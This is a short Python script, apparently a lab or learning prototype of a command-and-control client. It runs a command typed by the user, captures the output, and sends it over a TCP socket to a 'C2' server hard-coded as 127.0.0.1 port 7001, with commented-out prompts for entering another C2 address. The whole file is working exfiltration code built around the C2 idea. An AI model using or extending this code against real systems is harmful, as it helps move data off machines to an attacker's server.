#!/usr/bin/python3

# Standard libraries only
import socket
import subprocess
import base64

# Initialize remote host variables with user input
#rhost = str(input("C2 IP Address\n" ))
rhost = '127.0.0.1'
#rport = int(input("C2 Port\n"))
rport = 7001
rserver = (rhost, rport)

# Run command
cmd = input("What is your command\n")
cmdarg = str(cmd).split(" ")
execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
data = execute.stdout

# Connect out
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(rserver)
s.sendall(bytes(execute.stdout, "utf-8"))